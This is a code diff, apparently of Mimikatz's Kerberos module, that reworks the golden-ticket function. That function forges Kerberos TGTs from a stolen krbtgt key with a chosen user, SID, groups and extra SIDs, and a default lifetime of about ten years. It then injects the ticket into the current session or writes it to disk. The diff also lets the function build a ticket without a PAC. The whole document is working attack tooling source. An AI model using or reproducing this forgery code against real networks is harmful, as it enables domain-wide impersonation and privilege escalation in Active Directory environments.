@@ -65,8 +65,7 @@ NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
 			kprintf(L"* Directory: \'%s\'\n", argv[i]);
 			kull_m_file_Find(argv[i], L"*.kirbi", FALSE, 0, FALSE, kuhl_m_kerberos_ptt_directory, NULL);
 		}
-		else
-			kuhl_m_kerberos_ptt_directory(0, argv[i], PathFindFileName(argv[i]), NULL);
+		else kuhl_m_kerberos_ptt_directory(0, argv[i], PathFindFileName(argv[i]), NULL);
 	}
 	return STATUS_SUCCESS;
 }
@@ -78,7 +77,7 @@ BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCH
 		kprintf(L"\n* File: \'%s\': ", fullpath);
 		kuhl_m_kerberos_ptt_file(fullpath);
 	}
-	return TRUE;
+	return FALSE;
 }
 
 void kuhl_m_kerberos_ptt_file(PCWCHAR filename)
@@ -410,10 +409,10 @@ wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, L
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType = 0, rodc = 0;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, szClaims, /*base,*/ filename;
-	PWCHAR baseDot, netbiosDomain;
-	PISID pSid;
+	DWORD keyType = 0, i, j, id = 500, nbGroups, nbSids = 0, rodc = 0;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szKey = NULL, szLifetime, szSid, szId, szGroups, szSids, szClaims, szRodc, filename;
+	PWCHAR baseDot, netbiosDomain = NULL;
+	PISID pSid = NULL;
 	PGROUP_MEMBERSHIP groups = NULL;
 	PKERB_SID_AND_ATTRIBUTES sids = NULL;
 	PCLAIMS_SET pClaimsSet = NULL;
@@ -424,126 +423,107 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MIMIKATZ_KERBEROS_EXT);
-
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		{
 			if(baseDot = wcschr(szDomain, L'.'))
 			{
-				i = (DWORD) ((PBYTE) baseDot - (PBYTE) szDomain);
-				if(netbiosDomain = (PWCHAR) LocalAlloc(LPTR, i + sizeof(wchar_t)))
+				if(kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
+					keyType = KERB_ETYPE_DES_CBC_MD5;
+				else if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
+					keyType = KERB_ETYPE_RC4_HMAC_NT;
+				else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
+					keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
+				else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
+					keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
+
+				if(szKey)
 				{
-					for(j = 0; j < i / sizeof(wchar_t); j++)
-						netbiosDomain[j] = towupper(szDomain[j]);
+					kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);
+					kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);
 
-					if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
+					status = CDLocateCSystem(keyType, &pCSystem);
+					if(NT_SUCCESS(status))
 					{
-						if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
+						if(kull_m_string_stringToHex(szKey, key, pCSystem->KeySize))
 						{
-							if(kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
-								keyType = KERB_ETYPE_DES_CBC_MD5;
-							else if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
-								keyType = KERB_ETYPE_RC4_HMAC_NT;
-							else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
-								keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
-							else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
-								keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
-
-							if(szKey)
+							kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
+							GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
+							*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
+							lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
+							kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
+							*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+							kull_m_string_args_byName(argc, argv, L"renewmax", &szLifetime, szLifetime);
+							*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+							kprintf(L"User      : %s\nDomain    : %s", szUser, szDomain);
+							if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
 							{
-								kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);
-								kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);
-
-								if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
-									id = wcstoul(szId, NULL, 0);
-								if(kull_m_string_args_byName(argc, argv, L"rodc", &szRodc, NULL))
-									rodc = wcstoul(szRodc, NULL, 0);
-								kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL);
-								kuhl_m_pac_stringToGroups(szGroups, &groups, &nbGroups);
-								if(kull_m_string_args_byName(argc, argv, L"sids", &szSids, NULL))
-									kuhl_m_pac_stringToSids(szSids, &sids, &nbSids);
-								if(kull_m_string_args_byName(argc, argv, L"claims", &szClaims, NULL))
-									pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
-
-								status = CDLocateCSystem(keyType, &pCSystem);
-								if(NT_SUCCESS(status))
+								if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
 								{
-									if(kull_m_string_stringToHex(szKey, key, pCSystem->KeySize))
+									i = (DWORD) ((PBYTE) baseDot - (PBYTE) szDomain);
+									if(netbiosDomain = (PWCHAR) LocalAlloc(LPTR, i + sizeof(wchar_t)))
+										for(j = 0; j < i / sizeof(wchar_t); j++)
+											netbiosDomain[j] = towupper(szDomain[j]);
+									if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
+										id = wcstoul(szId, NULL, 0);
+									kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL);
+									kuhl_m_pac_stringToGroups(szGroups, &groups, &nbGroups);
+									if(kull_m_string_args_byName(argc, argv, L"sids", &szSids, NULL))
+										kuhl_m_pac_stringToSids(szSids, &sids, &nbSids);
+									if(kull_m_string_args_byName(argc, argv, L"claims", &szClaims, NULL))
+										pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
+									if(kull_m_string_args_byName(argc, argv, L"rodc", &szRodc, NULL))
+										rodc = wcstoul(szRodc, NULL, 0);
+									kprintf(L" (%s)\nSID       : %s\nUser Id   : %u\nGroups Id : *", netbiosDomain, szSid, id);
+									for(i = 0; i < nbGroups; i++)
+										kprintf(L"%u ", groups[i].RelativeId);
+									if(nbSids)
 									{
-										kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
-										GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
-										*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
-										lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
-										kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
-										*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
-										kull_m_string_args_byName(argc, argv, L"renewmax", &szLifetime, szLifetime);
-										*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
-
-										kprintf(
-											L"User      : %s\n"
-											L"Domain    : %s (%s)\n"
-											L"SID       : %s\n"
-											L"User Id   : %u\n", szUser, szDomain, netbiosDomain, szSid, id);
-										kprintf(L"Groups Id : *");
-										for(i = 0; i < nbGroups; i++)
-											kprintf(L"%u ", groups[i].RelativeId);
-										if(nbSids)
+										kprintf(L"\nExtra SIDs: ");
+										for(i = 0; i < nbSids; i++)
 										{
-											kprintf(L"\nExtra SIDs: ");
-											for(i = 0; i < nbSids; i++)
-											{
-												kull_m_string_displaySID(sids[i].Sid);
-												kprintf(L" ; ");
-											}
+											kull_m_string_displaySID(sids[i].Sid);
+											kprintf(L" ; ");
 										}
-										if(pClaimsSet)
-										{
-											kprintf(L"\nClaims    :\n");
-											kuhl_m_kerberos_claims_displayClaimsSet(pClaimsSet);
-										}
-										kprintf(L"\nServiceKey: ");
-										kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
-										if(szService)
-											kprintf(L"Service   : %s\n", szService);
-										if(szTarget)
-											kprintf(L"Target    : %s\n", szTarget);
-										kprintf(L"Lifetime  : ");
-										kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
-										kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
-										kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
-
-										kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
-
-										if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, netbiosDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc, pClaimsSet))
-										{
-											if(isPtt)
-											{
-												if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
-													kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
-											}
-											else if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
-												kprintf(L"\nFinal Ticket Saved to file !\n");
-											else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
-
-											ber_bvfree(BerApp_KrbCred);
-										}
-										else PRINT_ERROR(L"BerApp_KrbCred error\n");
 									}
-									else PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n", pCSystem->KeySize * 2, pCSystem->KeySize, kuhl_m_kerberos_ticket_etype(keyType));
+									if(pClaimsSet)
+									{
+										kprintf(L"\nClaims    :\n");
+										kuhl_m_kerberos_claims_displayClaimsSet(pClaimsSet);
+									}
 								}
-								else PRINT_ERROR(L"Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6\n", keyType, status);
 							}
-							else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
-
-							LocalFree(pSid);
+							kprintf(L"\nServiceKey: ");
+							kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
+							if(szService)
+								kprintf(L"Service   : %s\n", szService);
+							if(szTarget)
+								kprintf(L"Target    : %s\n", szTarget);
+							kprintf(L"Lifetime  : ");
+							kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
+							kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
+							kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
+							kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
+							if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, key, pCSystem->KeySize, keyType, pSid, netbiosDomain, id, groups, nbGroups, sids, nbSids, rodc, pClaimsSet))
+							{
+								if(isPtt)
+								{
+									if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
+										kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
+								}
+								else if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
+									kprintf(L"\nFinal Ticket Saved to file !\n");
+								else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+								ber_bvfree(BerApp_KrbCred);
+							}
+							else PRINT_ERROR(L"BerApp_KrbCred error\n");
 						}
-						else PRINT_ERROR_AUTO(L"SID seems invalid - ConvertStringSidToSid");
+						else PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n", pCSystem->KeySize * 2, pCSystem->KeySize, kuhl_m_kerberos_ticket_etype(keyType));
 					}
-					else PRINT_ERROR(L"Missing SID argument\n");
-
-					LocalFree(netbiosDomain);
+					else PRINT_ERROR(L"Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6\n", keyType, status);
 				}
+				else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
 			}
 			else PRINT_ERROR(L"Domain name does not look like a FQDN\n");
 		}
@@ -551,6 +531,10 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	}
 	else PRINT_ERROR(L"Missing user argument\n");
 
+	if(pSid)
+		LocalFree(pSid);
+	if(netbiosDomain)
+		LocalFree(netbiosDomain);
 	if(groups && nbGroups)
 		LocalFree(groups);
 	if(sids && nbSids)
@@ -561,7 +545,6 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	}
 	if(pClaimsSet)
 		kuhl_m_kerberos_claims_free(pClaimsSet);
-
 	return STATUS_SUCCESS;
 }
 
@@ -597,12 +580,12 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet)
+PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, LPCBYTE key, DWORD keySize, DWORD keyType, PISID sid, LPCWSTR LogonDomainName, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet)
 {
-	NTSTATUS status;
+	NTSTATUS status = STATUS_INVALID_PARAMETER;
 	KIWI_KERBEROS_TICKET ticket = {0};
-	PKERB_VALIDATION_INFO pValidationInfo;
-	PPACTYPE pacType; DWORD pacTypeSize;
+	PKERB_VALIDATION_INFO pValidationInfo = NULL;
+	PPACTYPE pacType = NULL; DWORD pacTypeSize = 0;
 	LONG SignatureType;
 	PBERVAL BerApp_EncTicketPart, BerApp_KrbCred = NULL;
 
@@ -646,35 +629,43 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 	default:
 		SignatureType = KERB_CHECKSUM_HMAC_MD5;
 	}
-	
-	if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
+
+	if(sid) // we want a PAC !
 	{
-		if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
+		if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
 		{
-			kprintf(L" * PAC generated\n");
-			status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
+			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
+			{
+				kprintf(L" * PAC generated\n");
+				status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
+				if(NT_SUCCESS(status))
+					kprintf(L" * PAC signed\n");
+			}
+		}
+	}
+
+	if(!sid || NT_SUCCESS(status))
+	{
+		if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
+		{
+			kprintf(L" * EncTicketPart generated\n");
+			status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
 			if(NT_SUCCESS(status))
 			{
-				kprintf(L" * PAC signed\n");
-				if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
-				{
-					kprintf(L" * EncTicketPart generated\n");
-					status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
-					if(NT_SUCCESS(status))
-					{
-						kprintf(L" * EncTicketPart encrypted\n");
-						if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
-							kprintf(L" * KrbCred generated\n");
-						LocalFree(ticket.Ticket.Value);
-					}
-					else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
-					ber_bvfree(BerApp_EncTicketPart);
-				}
+				kprintf(L" * EncTicketPart encrypted\n");
+				if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
+					kprintf(L" * KrbCred generated\n");
+				LocalFree(ticket.Ticket.Value);
 			}
-			LocalFree(pacType);
+			else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
+			ber_bvfree(BerApp_EncTicketPart);
 		}
-		LocalFree(pValidationInfo);
 	}
+
+	if(pacType)
+		LocalFree(pacType);
+	if(pValidationInfo)
+		LocalFree(pValidationInfo);
 	if(ticket.Key.Value)
 		LocalFree(ticket.Key.Value);
 	if(ticket.ClientName)
